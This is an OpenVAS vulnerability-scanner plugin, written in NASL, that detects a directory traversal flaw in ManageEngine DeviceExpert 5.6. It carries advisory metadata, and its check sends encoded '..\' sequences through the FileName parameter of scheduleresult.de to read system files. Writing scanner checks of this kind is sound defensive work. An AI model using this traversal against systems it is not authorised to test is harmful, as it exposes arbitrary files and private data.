###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_manageengine_device_expert_dir_trav_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Zoho ManageEngine Device Expert Directory Traversal Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow remote attackers to perform directory
  traversal attacks and read arbitrary files on the affected application.
  Impact Level: Application";
tag_affected = "ManageEngine DeviceExpert version 5.6";
tag_insight = "The flaw is due to an input validation error in 'FileName' parameter
  to 'scheduleresult.de', which allows attackers to read arbitrary files via
  a ../(dot dot) sequences.";
tag_solution = "No solution or patch is available as of 20th March, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.manageengine.com/products/device-expert/";
tag_summary = "This host is running Zoho ManageEngine Device Expert and is prone
  to directory traversal vulnerability.";

if(description)
{
  script_id(802720);
  script_version("$Revision: 12 $");
  script_bugtraq_id(52559);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-03-20 15:57:28 +0530 (Tue, 20 Mar 2012)");
  script_name("Zoho ManageEngine Device Expert Directory Traversal Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/48456/");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/522004");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/110985/manageenginede56-traversal.txt");

  script_description(desc);
  script_summary("Check if ManageEngine DeviceExpert is prone to directory traversal vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 6060);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("openvas-https.inc");

## Variable initialization
port = 0;
req = "";
res = "";
file = "";
files = "";
sndReq = "";
rcvRes = "";
attack = "";

port = 6060;

## Check port state
if(!get_port_state(port)) {
  exit(0);
}

## Send and receive the response
sndReq = http_get(item:"/NCMContainer.cc", port:port);
rcvRes = https_req_get(port:port, request:sndReq);

## Confirm the application
if(rcvRes && ">ManageEngine DeviceExpert<" >< rcvRes)
{
  files = traversal_files();
  foreach file (keys(files))
  {
    ## Construct directory traversal attack
    attack = string("/scheduleresult.de/?FileName=",
             crap(data:"..%5C",length:3*15),files[file]);

    ## Send the attack
    req = http_get(item:attack, port:port);
    res = https_req_get(port:port, request:req);
    if(!res){
      continue;
    }

    ## Check the response to confirm vulnerability
    if(res && (egrep(pattern:file, string:res)))
    {
      security_warning(port);
      exit(0);
    }
  }
}
